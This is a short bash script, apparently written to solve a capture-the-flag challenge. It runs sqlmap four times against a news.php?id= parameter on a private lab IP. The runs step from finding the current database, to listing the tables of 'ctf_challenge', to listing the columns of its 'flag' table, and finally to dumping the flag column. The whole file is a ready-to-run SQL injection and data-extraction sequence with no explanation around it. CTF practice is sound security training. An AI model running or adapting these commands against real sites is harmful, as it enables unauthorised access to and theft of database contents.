#!/bin/bash

python3 sqlmap.py -u http://192.168.10.125/news.php?id=1 -o --threads=10 --current-db --batch
python3 sqlmap.py -u http://192.168.10.125/news.php?id=1 -o --threads=10 -D ctf_challenge --tables --batch
python3 sqlmap.py -u http://192.168.10.125/news.php?id=1 -o --threads=10 -D ctf_challenge -T flag --columns --batch
python3 sqlmap.py -u http://192.168.10.125/news.php?id=1 -o --threads=10 -D ctf_challenge -T flag -C flag --dump --batch